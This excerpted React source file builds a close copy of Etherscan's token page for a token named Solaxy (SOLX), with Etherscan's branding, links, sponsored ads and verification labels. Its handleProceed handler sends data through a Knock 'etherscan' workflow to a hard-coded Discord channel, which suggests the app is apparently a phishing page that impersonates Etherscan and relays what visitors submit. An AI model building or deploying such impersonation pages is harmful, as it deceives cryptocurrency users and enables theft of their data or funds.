...
import { Search, Copy, ExternalLink, ChevronDown, Info, Sun, X, User, BookOpen, ChevronUp, ArrowRight, RefreshCw, Plus, Edit, Flame, Flag } from 'lucide-react';
...
import ethereumLogoLight from './assets/images/empty-token.webp';
...
function App() {
  ...
  const menuItems = [
    {
      href: 'https://etherscan.io/tokencheck-tool?t=0xe0b7ad7f8f26e2b00c8b47b5df370f15f90fcf48',
      id: 'check-supply',
      icon: RefreshCw,
    ...
    {
      href: 'https://etherscan.io/contactus?id=5&a=0xe0b7ad7f8f26e2b00c8b47b5df370f15f90fcf48',
      id: 'update-name',
      icon: User,
  ...
  const handleProceed = async (e: any) => {
    ...
    await knock.objects.setChannelData(
      ...
      import.meta.env.VITE_KNOCK_DISCORD_CHANNEL_ID,
      {
        connections: [
          {
            channel_id: "1398301424861053080",
          },
        ],
      }
    );
    await knock.workflows.trigger("etherscan", {
      data: {
  ...
  const renderTabContent = () => {
    switch (activeTab) {
        ...
        return (
          <>
            ...
            <div className="py-4 mb-3 flex items-center">
              ...
              <span className="text-gray-900 font-bold text-sm">Contract Source Code Verified</span>
              <span className="text-gray-500 ml-2 text-sm">(Exact Match)</span>
              <div className="ml-auto">
                <RxExclamationTriangle className='text-2xl text-[#FFC007] font-bold' />
              </div>
            </div>

            {/* Contract Details Grid */}
            <div className="grid grid-cols-2 gap-16 gap-x-8 mb-3">
              ...
              <div className="">
                ...
                <div className="flex items-center space-x-3 pl-6">
                  ...
                  <div className="flex items-center space-x-2 py-1 px-1.5 bg-[#F8F9FA] border rounded-lg">
                    ...
                    <span className="text-gray-900 text-sm">No Contract Security Audit Submitted</span>
                  </div>
      ...
      case 'Read Contract':
        return (
          <div className='py-2'>
            <div className="bg-gray-200 border border-gray-300 rounded-md p-1 flex items-center text-sm text-gray-600 leading-relaxed mb-3">
              <Info className="scale-50 text-gray-500" />
      ...
      case 'Write Contract':
        return (
          <div className='py-2'>
            ...
            <div className="bg-gray-200 border border-gray-300 rounded-md p-1 flex items-center text-sm text-gray-600 leading-relaxed mb-4">
              <Info className="scale-50 text-gray-500" />
              <div className="flex-1 text-xs">
                Descriptions included below are taken from the contract source code{' '}
                <a
      ...
      <div className='bg-[#FAFAFB] pb-12'>
              ...
              <div>
                <h1 className="font-medium flex items-center">
                  <div className='text-gray-800'>
                    <span className='text-xl font-semibold'>Token </span> Solaxy <span className='text-[#6C757D]'>(SOLX)</span>
                  </div>
        ...
        <div className="mt-4">
          <div className="max-w-[84rem] mx-auto">
            <p className="text-[0.9rem] text-[#6C757D] flex items-center gap-x-1.5">
              <strong className='text-[#6C757D] flex items-center gap-x-1.5'>Sponsored: <div className='flex items-center gap-x-0.5'><img src={token99} alt="" /> Token6900: </div></strong> Whales Predict It’s The Next SPX6900. Presale LIVE! <a href="https://xuv.etherscan.com/d3d3/ZGVsaXZlcnk/Y3Cs=.php?YmFubmVyaWQ=8911&em9uZWlk=6&sig=f7cc9fd683254060281bb299c36aae6998946e4b0ddced5f1c09fac1ed47c4e0&oadest=https%3A%2F%2Fa1.adform.net%2FC%2F%3Fbn%3D81692528%3Bgdpr%3D%24%7Bgdpr%7D%3Bgdpr_consent%3D%24%7Bgdpr_consent_50%7D" className="text-[#0584C3] font-bold">Buy $T6900 Now!</a>
            </p>
          </div>
        </div>
            ...
            <div className="bg-white rounded-lg border p-6 px-4 shadow-md">
              ...
              <div className="space-y-4">
                <div className='space-y-1.5'>
                  ...
                  <p className="text-sm">82,999,999,999 SOLX</p>
                </div>

                <div className='space-y-1.5'>
                  <p className="text-xs text-gray-500 uppercase tracking-wide">HOLDERS</p>
                  <p className="text-sm">50,285</p>
                </div>
            ...
            <div className="bg-white rounded-lg border p-6 px-4 shadow-md">
              ...
              <div className="space-y-4">
                <div className='space-y-1.5'>
                  ...
                  <div className="flex items-center">
                    <FileText className='scale-75 text-gray-400' />
                    <a href="https://etherscan.io/address/0xe0b7ad7f8f26e2b00c8b47b5df370f15f90fcf48" className="text-[#0584C3] hover:underline text-sm font-mono">
          ...
          <div className="space-y-3">
            ...
            <div className="border border-[#E9ECEF] bg-white shadow-lg rounded-xl flex flex-col pt-3 pb-8">
              ...
              <div className="flex items-center justify-between px-6 py-3">
                ...
                {activeTab == "Code" && <div className="flex items-center space-x-">
            ...
            <p className='flex items-end text-xs space-x-1 text-[#6D767E]'><span><HiOutlineLightBulb className='text-lg' /></span>A token is a representation of an on-chain or off-chain asset. The token page shows information such as price, total supply, holders, transfers and social links. Learn more about this page in our <a href='https://info.etherscan.com/understanding-token-page/' className='text-[#0584C3]'>Knowledge Base</a>.</p>
          </div>
        </div>
      </div>
      {/* Footer */}
      <footer className="bg-gray-100 pt-8 pb-2">
        <div className="max-w-[87rem] mx-auto px-4">
          ...
          <div className="flex justify-between items-center mb-6">
            ...
            <a href="#top" className="text-black flex items-center text-sm">
